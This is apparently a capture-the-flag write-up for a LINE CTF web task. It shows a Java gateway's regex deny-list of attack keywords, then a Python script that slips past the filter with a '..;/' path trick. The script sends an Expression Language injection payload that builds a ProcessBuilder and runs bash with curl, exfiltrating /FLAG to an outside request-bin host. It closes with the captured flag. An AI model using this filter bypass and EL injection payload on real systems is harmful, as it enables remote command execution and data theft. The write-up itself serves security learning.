# Description

- gw filter bypass using `;`
```java
    private static final List<Pattern> ATTACK_PATTERNS = Arrays.asList(Pattern.compile("<script>(.*?)</script>", 2), Pattern.compile("src[\r\n]*=[\r\n]*\\'(.*?)\\'", 42), Pattern.compile("</script>", 2), Pattern.compile("<script(.*?)>", 42), Pattern.compile("eval\\((.*?)\\)", 42), Pattern.compile("expression\\((.*?)\\)", 42), Pattern.compile("javascript:", 2), Pattern.compile("vbscript:", 2), Pattern.compile("onload(.*?)=", 42), Pattern.compile("include\\s+(.*?)", 42), Pattern.compile("require\\s+(.*?)", 42), Pattern.compile("support", 2), Pattern.compile("runtime", 2), Pattern.compile("processbuilder", 2), Pattern.compile("scriptenginemanager", 2), Pattern.compile("eval", 2), Pattern.compile("exec", 2), Pattern.compile("yaml", 2), Pattern.compile("tostring", 2), Pattern.compile("character", 2), Pattern.compile("substr", 2), Pattern.compile("getmethods", 2), Pattern.compile("invoke", 2), Pattern.compile("\\.\\./", 2), Pattern.compile("\\.\\.\\\\", 2), Pattern.compile("%2e", 2), Pattern.compile("%2f", 2), Pattern.compile("/[^/]*/internal/", 2));
```

- `buildConstraintViolationWithTemplate` EL Injection

```python
import requests

headers = {
    'accept': 'application/json'
}

data = {
    #"name": "7815696ecbf1c96e6894b779456d3aaa",
    "name": '${"".getClass().forName("java.lang.ProcessBuilde".concat("r")).getDeclaredConstructors()[0].newInstance(["bash", "-c", "curl https://bhpvqke.request.dreamhack.games/$(cat /FLAG)"]).start()}',
}

res = requests.post('http://35.200.117.55:20080/api/external/..;/internal;/', headers=headers, json=data)
print(res)
print(res.headers)
print(res.text)
```

- **Flag: LINECTF{7988de328384f8a19998923a87aa053f}**
